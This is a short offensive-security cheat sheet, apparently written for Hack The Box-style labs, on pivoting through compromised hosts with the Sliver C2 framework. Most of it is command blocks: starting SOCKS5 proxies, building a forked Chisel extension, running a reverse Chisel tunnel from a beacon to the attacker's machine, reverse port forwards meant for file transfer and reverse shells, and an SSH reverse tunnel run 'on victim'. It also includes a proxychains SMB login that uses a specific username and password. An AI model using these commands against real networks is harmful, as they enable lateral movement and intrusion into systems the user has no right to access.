Only session mode supports built-in pivot commands.
## SOCKS5
You already know buddy.

Usage
```bash
# Start socks over default port 1080 (/etc/proxychains4.conf)
sliver > socks5 start -P 1080

# One-liner to setup proxychains config
sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf && sed -i s/9050/1080/g /etc/proxychains.conf'

# Verify
netstat -ano | grep 1080

# Example test
proxychains nxc smb <ip> -u '<user>' -p '<pass>'
```

## Chisel
No official Sliver extension (YET), but there is a forked version. 

Usage
```bash
sudo apt install mingw-w64 # Install prerequisites
git clone https://github.com/MrAle98/chisel # Install chisel

# Setup Sliver to work with fork
cd chisel/
mkdir ~/.sliver-client/extensions/chisel
cp extension.json ~/.sliver-client/extensions/chisel
make windowsdll_64
make windowsdll_32
cp chisel.x64.dll ~/.sliver-client/extensions/chisel/
cp chisel.x86.dll ~/.sliver-client/extensions/chisel/

# Start Chisel server on our machine
chisel server --reverse -p 1337 -v --socks5

# Connect back to chisel server from beacon
sliver > chisel client <lhost>:1337 R:socks  # beacon or session

# Test
proxychains <command> # nxc, ping, etc... against internal hosts
```
## Reverse Port Forward
Assume we have a pivot host and an internal victim we pivoted to. The box cannot reach our file server, but can access 8080 on pivot host. We can reverse port forward to open up the path, allowing for ingress file transfer (and revshells)

Execute on PIVOT HOST session
```bash
sliver > rportfwd add -b 8080 -r 127.0.0.1:8080
```

## SSH Reverse Port Forward
A method of port forwarding. Recent versions of Windows have `ssh` clients preinstalled.

```bash
# HTB VPN config requires SSH on 2222... Not usually necessary.
sh -c 'echo "Port 2222" >> /etc/ssh/sshd_config' 
systemctl restart sshd.service # service restart ssh (if in container)
ss -ntlp # verify

# On victim
ssh -R 1080 <l_user>@<lhost> -p 2222

# Example test
proxychains netexec smb 172.16.1.13 -u 'svc_sql' -p 'jkhnrjk123!'
```
